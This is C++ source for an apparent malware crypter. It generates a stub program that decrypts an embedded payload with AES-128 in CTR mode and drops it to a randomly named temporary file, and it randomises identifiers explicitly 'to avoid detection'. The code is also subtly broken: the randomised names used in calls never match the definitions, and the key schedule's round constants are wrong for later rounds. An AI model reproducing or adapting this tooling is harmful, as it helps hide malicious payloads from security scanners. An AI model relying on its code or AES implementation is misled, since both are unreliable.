#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <random>
#include <ctime>

// Generate random variable names to avoid detection
std::string generateRandomVarName() {
    static std::mt19937 rng(std::time(nullptr));
    static const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::string name = "v";
    for (int i = 0; i < 8; i++) {
        name += chars[rng() % chars.length()];
    }
    return name;
}

// Generate stealth stub without suspicious strings
std::string generateStealthStub(const std::string& key, const std::string& nonce) {
    std::string keyVar = generateRandomVarName();
    std::string nonceVar = generateRandomVarName();
    std::string funcVar = generateRandomVarName();
    
    return R"(
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>

// Stealth implementation - no suspicious names
const std::string )" + keyVar + R"( = ")" + key + R"(";
const std::string )" + nonceVar + R"( = ")" + nonce + R"(";

// AES-128 implementation with obfuscated names
static const uint8_t )" + funcVar + R"([256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// Obfuscated function names and implementation
inline uint8_t )" + generateRandomVarName() + R"((uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void )" + generateRandomVarName() + R"((uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = )" + funcVar + R"([state[i]];
    }
}

inline void )" + generateRandomVarName() + R"((uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void )" + generateRandomVarName() + R"((uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = )" + generateRandomVarName() + R"((0x02, s0) ^ )" + generateRandomVarName() + R"((0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ )" + generateRandomVarName() + R"((0x02, s1) ^ )" + generateRandomVarName() + R"((0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ )" + generateRandomVarName() + R"((0x02, s2) ^ )" + generateRandomVarName() + R"((0x03, s3);
        state[i*4+3] = )" + generateRandomVarName() + R"((0x03, s0) ^ s1 ^ s2 ^ )" + generateRandomVarName() + R"((0x02, s3);
    }
}

inline void )" + generateRandomVarName() + R"((uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void )" + generateRandomVarName() + R"((const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    memcpy(roundKeys, key, 16);
    
    for (int i = 1; i < 11; i++) {
        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
        for (int j = 0; j < 4; j++) temp[j] = )" + funcVar + R"([temp[j]];
        temp[0] ^= (1 << (i-1));
        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
    }
}

inline void )" + generateRandomVarName() + R"((const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    memcpy(state, input, 16);
    )" + generateRandomVarName() + R"((state, roundKeys);
    
    for (int round = 1; round < 10; round++) {
        )" + generateRandomVarName() + R"((state);
        )" + generateRandomVarName() + R"((state);
        )" + generateRandomVarName() + R"((state);
        )" + generateRandomVarName() + R"((state, roundKeys + round * 16);
    }
    
    )" + generateRandomVarName() + R"((state);
    )" + generateRandomVarName() + R"((state);
    )" + generateRandomVarName() + R"((state, roundKeys + 10 * 16);
    memcpy(output, state, 16);
}

inline void )" + generateRandomVarName() + R"((uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void )" + generateRandomVarName() + R"((const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    )" + generateRandomVarName() + R"((key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    memcpy(counter, nonce, 16);
    
    size_t processed = 0;
    while (processed < length) {
        )" + generateRandomVarName() + R"((counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        )" + generateRandomVarName() + R"((counter);
    }
}

void )" + generateRandomVarName() + R"((const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

int main() {
    // Convert hex strings to bytes
    uint8_t key[16], nonce[16];
    )" + generateRandomVarName() + R"(()" + keyVar + R"(, key);
    )" + generateRandomVarName() + R"(()" + nonceVar + R"(, nonce);

    // Embedded data (will be replaced by linker)
    uint8_t embeddedData[] = {0x00}; // Placeholder
    const size_t embeddedDataSize = sizeof(embeddedData);

    // Process the data
    )" + generateRandomVarName() + R"((embeddedData, embeddedData, embeddedDataSize, key, nonce);

    // Write processed data to file (stealth output)
    std::ofstream outFile(")" + generateRandomVarName() + R"(.tmp", std::ios::binary);
    if (outFile.is_open()) {
        outFile.write(reinterpret_cast<const char*>(embeddedData), embeddedDataSize);
        outFile.close();
    }

    return 0;
}
)";
}

int main() {
    // Generate random key and nonce
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    
    std::string key, nonce;
    for (int i = 0; i < 32; i++) {
        key += "0123456789abcdef"[dis(gen) % 16];
    }
    for (int i = 0; i < 32; i++) {
        nonce += "0123456789abcdef"[dis(gen) % 16];
    }
    
    // Generate stealth stub
    std::string stub = generateStealthStub(key, nonce);
    
    // Write to file
    std::ofstream outFile("stealth_stub.cpp");
    if (outFile.is_open()) {
        outFile << stub;
        outFile.close();
        std::cout << "Stealth stub generated successfully!" << std::endl;
        std::cout << "Key: " << key << std::endl;
        std::cout << "Nonce: " << nonce << std::endl;
    }
    
    return 0;
}